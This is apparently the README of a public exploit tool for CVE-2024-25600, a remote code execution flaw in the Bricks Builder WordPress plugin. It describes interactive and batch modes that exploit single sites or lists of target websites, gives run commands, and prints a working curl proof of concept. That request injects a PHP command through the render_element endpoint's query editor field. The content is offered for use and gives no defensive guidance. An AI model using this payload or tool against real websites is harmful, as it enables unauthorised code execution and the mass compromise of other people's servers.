# CVE-2024-25600 Exploit Tool 🚀

## Description 📝

This tool 🛠️ is designed to exploit the CVE-2024-25600 vulnerability 🕳️ found in the Bricks Builder plugin for WordPress. The vulnerability allows for unauthenticated remote code execution on affected websites 💻. The tool automates the exploitation process by retrieving nonces and sending specially crafted requests to execute arbitrary commands.

## Features 🌟

- **Interactive Mode**: Engage with the target website in real-time 🕹️.
- **Batch Mode**: Scan and exploit multiple websites from a list 📋.
- **Command Execution**: Execute arbitrary commands on the target server ⚙️.

## Installation 🛠️

1. Clone this repository to your local machine 🖥️ using `git clone`.
2. Navigate to the directory of the cloned repository.
3. Install the required Python libraries using `pip install -r requirements.txt`.

## Usage 📖

### Interactive Mode 🎮

1. Run the tool with `python exploit.py -u <URL>` to start interactive mode.
2. Follow the on-screen prompts to send commands to the target server.

### Batch Mode 📊

1. Prepare a text file with a list of target URLs.
2. Run the tool with `python exploit.py -l <file_path>` to scan and exploit the listed sites.

## Proof of Concept (PoC) 📝

The base PoC provided by the disclosure is as follows:

```bash
curl -k -X POST https://[HOST]/wp-json/bricks/v1/render_element \
-H "Content-Type: application/json" \
-d '{
  "postId": "1",
  "nonce": "[NONCE]",
  "element": {
    "name": "container",
    "settings": {
      "hasLoop": "true",
      "query": {
        "useQueryEditor": true,
        "queryEditor": "throw new Exception(`id`);",
        "objectType": "post"
      }
    }
  }
}'
```

Replace `[HOST]` with the target website and `[NONCE]` with the nonce value retrieved from the site.
